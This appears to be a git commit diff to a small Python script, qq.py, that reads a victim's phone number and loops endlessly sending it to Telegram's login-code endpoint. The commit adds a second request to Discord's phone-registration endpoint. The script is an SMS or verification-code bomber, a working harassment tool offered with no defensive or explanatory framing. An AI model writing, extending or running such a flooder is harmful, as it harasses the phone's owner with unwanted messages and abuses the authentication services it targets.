d590274a5022ded2bab715f61e4b8316ee6a82cf
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 12:07:32 +0200

    Add files via upload

--- qq.py
+++ qq.py
@@ -7,10 +7,21 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
  
 while True:
+
  try:
      print('+')
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
  except:
      print('=')
+ try:
+     print('+')
+     response = requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, json={'phone': "+" + NUMBER})
+ except:
+     print('=')
+	 
      
 time.sleep(5000)
+
+
+
+
